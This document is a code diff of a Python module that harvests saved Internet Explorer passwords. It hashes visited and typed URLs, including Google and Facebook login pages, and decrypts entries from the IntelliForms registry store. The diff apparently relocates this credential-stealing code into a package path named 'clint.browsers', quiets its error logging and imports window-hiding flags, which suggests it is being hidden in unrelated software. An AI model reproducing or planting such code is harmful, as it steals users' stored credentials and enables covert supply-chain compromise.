@@ -1,19 +1,28 @@
 import hashlib
 import subprocess
-import winreg
 import traceback
 
-from logger import log
-from .config import winstructure as win
-from .config.constant import constant
+import clint.browsers.config.winstructure as win
+import logging
+from clint.browsers.config.constant import constant
+
+try: 
+    import _subprocess as sub
+    STARTF_USESHOWWINDOW = sub.STARTF_USESHOWWINDOW  # Not work on Python 3
+    SW_HIDE = sub.SW_HIDE
+except ImportError:
+    STARTF_USESHOWWINDOW = subprocess.STARTF_USESHOWWINDOW
+    SW_HIDE = subprocess.SW_HIDE
+
+try: 
+    import _winreg as winreg
+except ImportError:
+    import winreg
 
 
-STARTF_USESHOWWINDOW = subprocess.STARTF_USESHOWWINDOW
-SW_HIDE = subprocess.SW_HIDE
-
-class IE():
+class IE:
     def __init__(self):
-        self.name = "ie"
+        self.name = 'ie'
 
     def get_hash_table(self):
         # get the url list
@@ -26,7 +35,7 @@ class IE():
                 h = (urls[u] + '\0').encode('UTF-16LE')
                 hash_tables.append([h, hashlib.sha1(h).hexdigest().lower()])
             except Exception:
-                log.critical(traceback.format_exc())
+                logging.debug(traceback.format_exc())
         return hash_tables
 
     def get_history(self):
@@ -34,7 +43,7 @@ class IE():
         try:
             urls = urls + self.history_from_powershell()
         except Exception:
-            log.critical(traceback.format_exc())
+            logging.debug(traceback.format_exc())
 
         urls = urls + ['https://www.facebook.com/', 'https://www.gmail.com/', 'https://accounts.google.com/',
                        'https://accounts.google.com/servicelogin']
@@ -94,6 +103,7 @@ class IE():
         try:
             hkey = win.OpenKey(win.HKEY_CURRENT_USER, 'Software\\Microsoft\\Internet Explorer\\TypedURLs')
         except Exception:
+            logging.debug(traceback.format_exc())
             return []
 
         num = winreg.QueryInfoKey(hkey)[1]
@@ -148,13 +158,14 @@ class IE():
 
     def run(self):
         if float(win.get_os_version()) > 6.1:
+            logging.debug(u'Internet Explorer passwords are stored in Vault (check vault module)')
             return
 
         pwd_found = []
         try:
             hkey = win.OpenKey(win.HKEY_CURRENT_USER, 'Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2')
         except Exception:
-            log.critical(traceback.format_exc())
+            logging.debug(traceback.format_exc())
         else:
             nb_site = 0
             nb_pass_found = 0
@@ -179,9 +190,7 @@ class IE():
 
             # manage errors
             if nb_site > nb_pass_found:
-                self.error(u'%s hashes have not been decrypted, the associate website used to decrypt the '
+                logging.error(u'%s hashes have not been decrypted, the associate website used to decrypt the '
                            u'passwords has not been found' % str(nb_site - nb_pass_found))
 
         return pwd_found
-
-internet_explorer=IE()
